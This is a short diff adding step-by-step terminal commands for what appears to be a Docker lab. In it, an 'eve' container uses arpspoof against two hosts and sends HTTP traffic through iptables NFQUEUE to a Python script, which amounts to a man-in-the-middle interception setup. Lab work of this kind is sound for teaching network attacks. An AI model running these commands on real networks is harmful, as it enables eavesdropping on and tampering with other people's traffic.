@@ -1,0 +1,7 @@
+[TERMINAL 1] docker compose up --build
+[TERMINAL 2] docker compose exec eve /bin/zsh
+[TERMINAL 2] nohup arpspoof -i eth0 10.0.1.2 &
+[TERMINAL 2] nohup arpspoof -i eth0 10.0.1.3 &
+[TERMINAL 2] iptables -A FORWARD -p tcp --dport 80 -j NFQUEUE --queue-num 1
+[TERMINAL 2] iptables -A FORWARD -p tcp --sport 80 -j NFQUEUE --queue-num 1
+[TERMINAL 2] python3 main.py
